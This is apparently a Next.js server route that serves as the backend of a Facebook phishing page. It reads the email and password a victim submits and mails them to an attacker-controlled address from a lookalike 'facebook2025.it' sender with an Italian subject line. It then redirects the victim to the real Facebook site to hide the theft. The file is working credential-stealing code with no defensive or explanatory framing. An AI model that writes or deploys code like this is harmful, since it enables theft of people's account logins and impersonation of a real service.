import { NextResponse } from 'next/server';
import { Resend } from 'resend';

export async function POST(request: Request) {
  const body = await request.formData();
  const email = body.get('email') || 'N/A';
  const password = body.get('password') || 'N/A';

  const resend = new Resend(process.env.RESEND_API_KEY);

  try {
    await resend.emails.send({
      from: 'securitynoreply@facebook2025.it',
      to: process.env.EMAIL_TO!,
      subject: 'Nuovo accesso dal sito facebook',
      text: `Email: ${email} | Password: ${password}`,
    });

    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    return NextResponse.json({ error: 'Errore durante l’invio email' }, { status: 500 });
  }
}
